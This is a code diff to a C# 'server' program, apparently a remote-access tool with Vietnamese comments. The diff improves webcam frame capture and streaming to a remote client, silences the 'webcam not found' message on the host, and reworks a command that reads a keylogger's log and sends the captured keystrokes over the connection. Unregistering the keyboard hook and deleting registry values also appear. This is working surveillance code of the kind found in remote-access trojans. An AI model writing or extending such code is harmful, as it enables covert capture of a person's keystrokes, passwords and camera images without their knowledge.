@@ -415,7 +415,7 @@ namespace server
                 videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                 if (videoDevices.Count == 0)
                 {
-                    MessageBox.Show("Không tìm thấy Webcam!");
+                    // MessageBox.Show("Không tìm thấy Webcam!");
                     return;
                 }
                 // Lấy cam đầu tiên
@@ -464,52 +464,53 @@ namespace server
         {
             try
             {
-                // 1. GIỚI HẠN FPS (Chỉ gửi 10 hình/giây = 100ms/hình)
-                // Nếu chưa đủ 100ms từ lần gửi trước thì bỏ qua ngay
-                if ((DateTime.Now - lastSendTime).TotalMilliseconds < 38) return;
+                // Giới hạn FPS: Chỉ gửi nếu đã qua 50ms (tránh nghẽn mạng LAN)
+                if ((DateTime.Now - lastSendTime).TotalMilliseconds < 50) return;
                 lastSendTime = DateTime.Now;
 
-                // 2. RESIZE ẢNH (Thu nhỏ để gửi cho nhanh)
-                // Lấy ảnh gốc từ Webcam
-                Bitmap original = (Bitmap)eventArgs.Frame.Clone();
-                
-                // Tạo ảnh nhỏ hơn (Ví dụ: rộng 480px, chiều cao tự tính theo tỉ lệ)
-                int newWidth = 480; 
-                int newHeight = (original.Height * newWidth) / original.Width;
-                Bitmap resized = new Bitmap(original, newWidth, newHeight);
-
-                // 3. NÉN ẢNH JPEG (Chất lượng 40%)
-                MemoryStream ms = new MemoryStream();
-                ImageCodecInfo jpgEncoder = GetEncoder(ImageFormat.Jpeg);
-                System.Drawing.Imaging.Encoder myEncoder = System.Drawing.Imaging.Encoder.Quality;
-                EncoderParameters myEncoderParameters = new EncoderParameters(1);
-                
-                // Giảm chất lượng xuống 40L để file nhẹ, truyền nhanh
-                myEncoderParameters.Param[0] = new EncoderParameter(myEncoder, 40L);
-
-                resized.Save(ms, jpgEncoder, myEncoderParameters);
-                byte[] buffer = ms.ToArray();
-
-                // 4. GỬI ĐI
-                // Dùng lock để tránh xung đột dữ liệu nếu gửi quá nhanh
-                lock (Program.client) 
+                // Clone và Resize ảnh
+                using (Bitmap original = (Bitmap)eventArgs.Frame.Clone())
                 {
-                    Program.nw.WriteLine(buffer.Length.ToString());
-                    Program.nw.Flush();
-                    Program.client.Send(buffer);
-                }
+                    // Resize xuống 480px để nhẹ mạng (Wifi thường yếu hơn dây)
+                    int newWidth = 480;
+                    int newHeight = (original.Height * newWidth) / original.Width;
+                    using (Bitmap resized = new Bitmap(original, newWidth, newHeight))
+                    {
+                        using (MemoryStream ms = new MemoryStream())
+                        {
+                            // Nén JPEG chất lượng 50%
+                            ImageCodecInfo jpgEncoder = GetEncoder(ImageFormat.Jpeg);
+                            System.Drawing.Imaging.Encoder myEncoder = System.Drawing.Imaging.Encoder.Quality;
+                            EncoderParameters myEncoderParameters = new EncoderParameters(1);
+                            myEncoderParameters.Param[0] = new EncoderParameter(myEncoder, 50L);
 
-                // Dọn dẹp bộ nhớ ngay lập tức
-                original.Dispose();
-                resized.Dispose();
-                ms.Close();
+                            resized.Save(ms, jpgEncoder, myEncoderParameters);
+                            byte[] buffer = ms.ToArray();
+
+                            // --- ĐOẠN QUAN TRỌNG NHẤT: GỬI QUA MẠNG ---
+                            lock (Program.client) 
+                            {
+                                // 1. Gửi Header kích thước (Dạng chuỗi byte, kết thúc bằng \n)
+                                // Tuyệt đối KHÔNG dùng Program.nw.WriteLine ở đây để tránh lệch buffer
+                                string header = buffer.Length.ToString() + "\n";
+                                byte[] headerBytes = Encoding.ASCII.GetBytes(header);
+                                Program.client.Send(headerBytes);
+
+                                // 2. Gửi dữ liệu ảnh
+                                Program.client.Send(buffer);
+                            }
+                            // ------------------------------------------
+                        }
+                    }
+                }
             }
             catch 
             {
-                // Nếu lỗi mạng thì tắt cam để tránh crash
-                try { videoSource.SignalToStop(); } catch {}
+                // Lỗi thì bỏ qua frame này, không crash server
             }
         }
+
+
         public String deletevalue(ref RegistryKey a,ref String link, ref String valueName)
         {
             try
@@ -685,11 +686,25 @@ namespace server
                     case "UNHOOK": 
                         KeyLogger.appstart.isRecording = false; // Tắt ghi
                         break;
-                    case "PRINT": 
+                    case "PRINT":
                         String content = "";
-                        try { if (File.Exists(KeyLogger.appstart.path)) content = File.ReadAllText(KeyLogger.appstart.path); } catch {}
+                        try 
+                        { 
+                            if (File.Exists(KeyLogger.appstart.path)) 
+                            {
+                                // SỬA: Dùng FileStream với FileShare.ReadWrite để không bị lỗi khi Hook đang ghi
+                                using (FileStream fs = new FileStream(KeyLogger.appstart.path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+                                using (StreamReader sr = new StreamReader(fs))
+                                {
+                                    content = sr.ReadToEnd();
+                                }
+                            } 
+                        } 
+                        catch {}
+                        
                         if (content == "") content = "[Trong]";
-                        Program.nw.Write(content); Program.nw.Flush();
+                        Program.nw.Write(content); 
+                        Program.nw.Flush();
                         break;
 
                     case "CLEAR":
@@ -1172,9 +1187,16 @@ namespace server
                         byte[] buffer = ms.ToArray();
 
                         // 3. Gửi kích thước -> Gửi ảnh
-                        Program.nw.WriteLine(buffer.Length.ToString());
-                        Program.nw.Flush();
-                        Program.client.Send(buffer);
+                        lock (Program.client)
+                        {
+                            // 1. Gửi Header kích thước (Chuyển sang byte mảng để gửi trực tiếp qua Socket)
+                            string header = buffer.Length.ToString() + "\n";
+                            byte[] headerBytes = Encoding.ASCII.GetBytes(header);
+                            Program.client.Send(headerBytes);
+
+                            // 2. Gửi Dữ liệu ảnh
+                            Program.client.Send(buffer);
+                        }
 
                         // Dọn dẹp
                         ms.Close();
